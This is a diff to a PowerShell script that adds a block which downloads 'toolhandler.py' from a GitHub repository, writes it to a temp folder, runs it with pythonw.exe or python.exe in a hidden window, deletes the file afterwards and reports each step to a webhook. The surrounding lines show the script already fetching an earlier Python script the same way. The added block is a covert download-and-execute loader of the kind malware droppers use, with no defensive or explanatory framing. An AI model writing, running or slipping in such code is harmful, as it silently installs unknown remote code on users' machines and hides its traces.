@@ -226,6 +226,63 @@ try {
         Send-WebhookMessage -Message "Error downloading Python script: $_"
     }
 
+    $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
+    try {
+        $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
+        $pythonCode = $response.Content | Out-String
+        Send-WebhookMessage -Message "Downloaded toolhandler Python script"
+        
+        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
+        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
+        
+        if (-not $pythonwExists -and -not $pythonExists) {
+            Send-WebhookMessage -Message "No Python interpreter found for toolhandler (pythonw.exe or python.exe)"
+        } else {
+            if ($pythonwExists) {
+                try {
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.pyw"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process pythonw.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed toolhandler Python script with pythonw.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing toolhandler with pythonw.exe: $_"
+                    if ($pythonExists) {
+                        try {
+                            $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
+                            [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                            Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                            Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
+                        } catch {
+                            Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
+                        }
+                    } else {
+                        Send-WebhookMessage -Message "python.exe not found, cannot fallback for toolhandler"
+                    }
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            } elseif ($pythonExists) {
+                try {
+                    $tempScriptPath = Join-Path -Path $tempFolder -ChildPath "temp_toolhandler.py"
+                    [System.IO.File]::WriteAllText($tempScriptPath, $pythonCode)
+                    Start-Process python.exe -ArgumentList $tempScriptPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                    Send-WebhookMessage -Message "Executed toolhandler Python script with python.exe"
+                } catch {
+                    Send-WebhookMessage -Message "Error executing toolhandler with python.exe: $_"
+                } finally {
+                    if (Test-Path $tempScriptPath) {
+                        Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+        }
+    } catch {
+        Send-WebhookMessage -Message "Error downloading toolhandler Python script: $_"
+    }
+
+
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 } catch {
     Send-WebhookMessage -Message "Unexpected error: $_"
